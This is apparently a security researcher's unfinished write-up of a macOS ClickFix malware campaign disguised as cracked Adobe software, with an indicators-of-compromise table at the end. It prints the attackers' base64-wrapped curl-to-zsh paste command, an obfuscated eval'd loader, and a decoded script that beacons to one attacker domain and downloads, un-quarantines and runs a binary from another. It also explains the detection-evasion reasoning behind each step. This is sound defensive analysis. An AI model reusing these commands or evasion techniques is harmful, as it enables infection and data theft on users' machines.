---
title: "Analyzing HavenC2 Campaign"
date: 2026-08-09 12:00:00 +0200
description: "You thought you found a cracked version of Adobe Creative Cloud suite but you end up with an infected device. Discover the analysis of MacOS malware infection chain."
tags: [macos, malware, forensics]
draft: false
---

# Context

> Work in progress

# Stage 0 - Fake Installer Command Execution

Entrypoint pasted into Terminal by the victim:

```bash
curl -s $(echo "aHR0cHM6Ly9oYXZlbi0xMC5jb20vY3VybC9mYWZiZTY4OTI0M2VmMmJjMjU2M2E5ZmFiNTBiMTUyMTJiMDc3YmFjYTI0MjdjMzI1MGI5YjQ5YzAzNGUwYWFk" | openssl base64 -d -A) | zsh
```

Decode:

```bash
echo "aHR0cHM6Ly9oYXZlbi0xMC5jb20vY3VybC9mYWZiZTY4OTI0M2VmMmJjMjU2M2E5ZmFiNTBiMTUyMTJiMDc3YmFjYTI0MjdjMzI1MGI5YjQ5YzAzNGUwYWFk" | base64 -d
# https://haven-10.com/curl/fafbe689243ef2bc2563a9fab50b15212b077baca2427c3250b9b49c034e0aad
```

Three deliberate properties:

- **Base64-wrapped URL** : defeats copy/paste inspection and clipboard-monitoring by EDRs. The victim never sees a domain nor an URL which reduces suspicions.
- **`openssl base64` instead of `base64 -d`** : `-A` handles the single-line blob, and `openssl` draws fewer detection rules.
- **`curl | zsh`** : payload never touches disk; nothing for on-access AV to scan. `-s` hides the progress meter that would expose the transfer.

The path `/curl/<64-hex>` is a per-victim token.

---

# Stage 1 - Obfuscated zsh loader

The server returns the script analyzed as `/tmp/stage0.bin`. Roughly 95% of it is decoy:

```bash
# dead code: result never used
w9sqdyo1pi29="$(sw_vers -productVersion 2>/dev/null)"
zzyr74=$(uname -s 2>/dev/null)

# entropy/timing padding, no side effect
pcoy=0
while [ $pcoy -lt 2 ]; do
  : "$((RANDOM % 256))"
  pcoy=$((pcoy+1))
done

# never called
check_integrity_w21() {
  local x944=0
  [ -d "$HOME" ] && x944=1
  return $x944
}

# decoy blob: never referenced by any line in the script
v6ldfsx0=$(cat <<'_EOF_'
eZaXej72XasO2204IR1Kw+sl4G7BBK+ACpSUGrfgO7zdkelIWRdgPk5kagnT
_EOF_
)
```

`v6ldfsx0` decodes to 45 bytes of random data (not payload):

```bash
echo 'eZaXej72XasO2204IR1Kw+sl4G7BBK+ACpSUGrfgO7zdkelIWRdgPk5kagnT' | base64 -d | od -A x -t x1z
# 79 96 97 7a 3e f6 5d ab ...  no header, no structure
```

The functional code is three lines: a gzip'd, base64'd blob that is decompressed into a variable and `eval`'d:

```bash
zt070w=$(openssl base64 -d <<'PAYLOAD_END' | gunzip
H4sIAAAAAAAC/6xTXU/bShB996/Ym2vFRFe+mVl7dwlqkAptRaBVafkoVCuhEDuJiWPHsU3shPz3
andNCW0f+7CSZ+fMObMzx//+072Pku46n1pWmgalR4ezvO637L0oIG5J6GE3CB+7SRnHnZYVzItq
vJolQU8h8jofFTFxEzJd/T8P53m0DncLyNMTCUfTlECnZc1YTTErRn3h0Z71kE9XVPiT6bi/LwS1
rJgvFwXt23uLZZQUY+JIZCCR+81R354EQSUwoY/O+yiRc4k+k8i4BMZMzFCiT/U9MJX3JOoaZmp1
HWgcNPeaQ2vRpt4zmiqv7nijIUSDfdFVdSCY4dTcnuFSed93OlbK79ny1fM0PWvkFMTeaNCWuOP8
grg+cd1RmiThqHCLaB6mZUEYcd35sNIxQSDuDTn/fHFJ3BPilHm4PCBvJ4PqenGbngyhEiwUkBSn
UXJ1e/7l/bqXZ/vHD1/j62CVnXx0P32o786rASwcXX9URnEweKcpsuro+717mZwFd6fLFMLFUZ2U
V3B3NVxNzx6Oa1j5ePOtHgwc0rI3ZnfbFnnzsvodF9DDNpK2lY2qePhXNgwcJXD442ZBj1ONFiV6
KJFSicg0HsGXCF4zci5RoERULhGGg3oS9NbUN5eIvlqNRE9IBBWDwdPm+L5Eqg4zvYIw/Mp5jBp+
tWLVBxfmjR6VwE3f5o2ecdtPpz27yG/erl3kdKzp4zrLJrvzM3jfuFfP43lmzPTNm29OnY615HFv
/Gr8Al4kjPGdjjWLonLym1EVq1LR/85rs6bE3pjetsTemC1vSbtN7I2W3BJ3tAPRCS2yJf9Vvyaa
wLIOiL2JaG8+y4IaDvqw1TcFTehjtdLxjwAAAP//U/+dAboEAAA=
PAYLOAD_END
)
eval "${zt070w}"
```

`H4sI` is the base64 signature of the gzip magic `1f 8b 08`. Extract stage 2:

```bash
sed -n '/^H4sIAAAA/,/^PAYLOAD_END/p' /tmp/malicious | grep -v PAYLOAD_END \
  | base64 -d | gunzip > stage2.sh
```

---

## Stage 2 - Recon, beacon, second-stage fetch

Every string is stored as octal `printf` escapes, so the decompressed script still contains no greppable URL, domain, or command name:

```bash
oodu32aksy="$(id -u 2>/dev/null)"
dmtxfwknd9="$(sysctl -n hw.memsize 2>/dev/null || echo 0)"

l6rpt2=$(printf '\150\164\164\160\163\072\057\057\150\141\166\145\156...')
o6b5r=$(printf '\143\165\162\154')
${o6b5r} -fsS -4 --connect-timeout 5 --max-time 10 -X POST \
  -H 'user: AgIxVpYoHa0x75e70ntJinUYPQEz9sq8CjRlVdwqHL-MFy_PxI0p' \
  -H 'BuildID: AgIqxBZb-TnKd_Jro0epBynuU0_UawhKjCy0w41XWyII' \
  "${l6rpt2}" </dev/null >/dev/null 2>&1 &

qcxla2=$(printf '\150\164\164\160\163\072\057\057\150\141\166\145\156\055\061\060...')
hvzqqg=$(printf '\057\164\155\160\057\150\145\154\160\145\162')
r6l9f=$(printf '\170\141\164\164\162')
kiiug=$(printf '\143\150\155\157\144')
${o6b5r} -o ${hvzqqg} ${qcxla2} && ${r6l9f} -c ${hvzqqg} && ${kiiug} +x ${hvzqqg} && ${hvzqqg}
```

Resolve all octal strings at once:

```bash
grep -o "printf '[\\0-7]*'" stage2.sh | sed "s/printf '//;s/'$//" | while read -r s; do printf '%b\n' "$s"; done
```

Output:

```
https://haven-vibe.com/api/metrics/run?event=pasted
curl
https://haven-10.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/kis/update
/tmp/helper
xattr
chmod
```

Final second stage payload:

```bash
id -u                      # capture UID (root vs. user check)
sysctl -n hw.memsize       # RAM size — classic VM/sandbox fingerprint

# 1. Beacon
curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST \
  -H 'user: AgIxVpYoHa0x75e70ntJinUYPQEz9sq8CjRlVdwqHL-MFy_PxI0p' \
  -H 'BuildID: AgIqxBZb-TnKd_Jro0epBynuU0_UawhKjCy0w41XWyII' \
  "https://haven-vibe.com/api/metrics/run?event=pasted" &

# 2. Second-stage download and execute
curl -o /tmp/helper "https://haven-10.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/kis/update" \
  && xattr -c /tmp/helper \
  && chmod +x /tmp/helper \
  && /tmp/helper
```

Behaviour, in order:

1. **Recon:** `id -u` establishes privilege level; `sysctl -n hw.memsize` is a VM/sandbox check (analysis VMs are typically provisioned low).
2. **Beacon:** POST to `haven-vibe.com`, backgrounded with `&` and fully silenced. `event=pasted` is operator telemetry confirming the ClickFix paste vector; `user:` and `BuildID:` headers are per-victim and per-campaign/affiliate tracking tokens. Tight `--connect-timeout 5 --max-time 10` prevents a hang from stalling the chain. Note the beacon domain differs from the payload domain — telemetry and delivery are on separate infrastructure.
3. **Download:** stage 3 written to `/tmp/helper`.
4. **Gatekeeper bypass**: `xattr -c` clears `com.apple.quarantine`. This step only matters for a signed/Mach-O binary, confirming stage 3 is a compiled executable rather than a script.
5. **Execute:** chained with `&&`, so execution is conditional on each prior step succeeding.

> Work in progess

---

## IOCs

| Type        | Value                                                                                        | Description                                                             |
| ----------- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| SHA-256     | `b58aca0fc7ac1c12dc5eb4c81d2d2439bb0d147df9899efc60fe9c4138ae15f4`                           | Stage 1 obfuscated zsh loader                                           |
| URL         | `https://haven-10.com/curl/fafbe689243ef2bc2563a9fab50b15212b077baca2427c3250b9b49c034e0aad` | Stage 0 entrypoint; serves stage 1. Per-victim token, likely single-use |
| URL         | `https://haven-10.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/kis/update`                | Stage 3 Mach-O payload                                                  |
| URL         | `https://haven-vibe.com/api/metrics/run?event=pasted`                                        | Infection beacon; fires before payload fetch                            |
| Domain      | `haven-10.com`                                                                               | Payload distribution host                                               |
| Domain      | `haven-vibe.com`                                                                             | Telemetry / victim-tracking C2                                          |
| HTTP header | `user: AgIxVpYoHa0x75e70ntJinUYPQEz9sq8CjRlVdwqHL-MFy_PxI0p`                                 | Per-victim identifier                                                   |
| HTTP header | `BuildID: AgIqxBZb-TnKd_Jro0epBynuU0_UawhKjCy0w41XWyII`                                      | Campaign / affiliate build identifier                                   |
| File path   | `/tmp/helper`                                                                                | Stage 3 drop location, `chmod +x`, quarantine cleared                   |
| URI pattern | `/curl/<64-hex>`, `/kis/update`                                                              | Path-prefix branching on distribution host                              |
| SHA-256     | `281870414e00e8abefafaca2bb3be289e28e4943d10329892fbe55c90f935cb5 `                          | Stage 2                                                                 |


